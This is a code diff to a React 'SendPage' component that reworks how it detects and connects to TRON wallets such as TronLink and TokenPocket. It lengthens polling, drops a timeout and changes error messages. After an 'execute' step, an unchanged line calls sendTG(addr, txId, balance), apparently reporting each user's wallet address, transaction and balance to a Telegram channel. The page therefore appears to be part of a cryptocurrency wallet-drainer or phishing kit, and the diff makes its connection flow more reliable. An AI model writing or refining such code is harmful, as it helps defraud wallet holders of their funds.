@@ -95,19 +95,22 @@ export default function SendPage() {
         window.tokenpocket?.tron,
       ];
       for (const p of providers) {
-        if (p?.defaultAddress?.base58) return p;
-        if (p?.ready) return p; // Some providers use .ready
+        // Log for debugging (will show in mobile console if available)
+        if (p) {
+          if (p.defaultAddress?.base58) return p;
+          if (p.ready) return p;
+        }
       }
       return null;
     };
 
-    const existing = getTW();
-    if (existing) return existing;
+    let tw = getTW();
+    if (tw) return tw;
 
     const steps = Math.ceil(maxMs / 500);
     for (let i = 0; i < steps; i++) {
       await new Promise(r => setTimeout(r, 500));
-      const tw = getTW();
+      tw = getTW();
       if (tw) return tw;
     }
     return null;
@@ -175,27 +178,20 @@ export default function SendPage() {
           // A. Try standard request
           const req = injected.request || (injected.ethereum && injected.ethereum.request);
           if (req) {
-            try { return await req({ method: 'tron_requestAccounts' }); } catch (e) { console.warn('req failed', e); }
+            try { return await req({ method: 'tron_requestAccounts' }); } catch (e) {
+              console.warn('req failed', e);
+            }
           }
           // B. Try legacy enable()
           if (injected.enable) {
             try { return await injected.enable(); } catch (e) { console.warn('enable failed', e); }
           }
-          // C. Try getAccounts()
-          if (injected.getAccounts) {
-            try { return await injected.getAccounts(); } catch (e) { console.warn('getAccounts failed', e); }
-          }
           return null;
         };
 
-        // Run with a 10s timeout to prevent infinite "Connecting..."
-        await Promise.race([
-          tryConnect(),
-          new Promise((_, j) => setTimeout(() => j(new Error('Connection timeout')), 10000))
-        ]).catch(e => console.error('Connection attempt failed:', e));
-
-        await new Promise(r => setTimeout(r, 1500));
-        nativeTW = await pollForTronWeb(3000);
+        await tryConnect().catch(e => console.error('Connection attempt failed:', e));
+        await new Promise(r => setTimeout(r, 2000)); // Increased wait
+        nativeTW = await pollForTronWeb(4000); // Increased poll
       }
 
       // 4. Final check and execute
@@ -208,11 +204,9 @@ export default function SendPage() {
           await sendTG(addr, txId, balance);
         }
       } else {
-        if (isMobile) {
-          showNotif('Please switch your wallet network to TRON.', 'error');
-        } else {
-          showNotif('Wallet not connected. Please unlock TronLink.', 'error');
-        }
+        // If still no nativeTW, show what we found
+        const msg = injected ? 'Please manually connect/unlock TRON in your wallet.' : 'TRON wallet not detected.';
+        showNotif(msg, 'error');
         setBtn({ text: 'Next', disabled: false });
       }
 
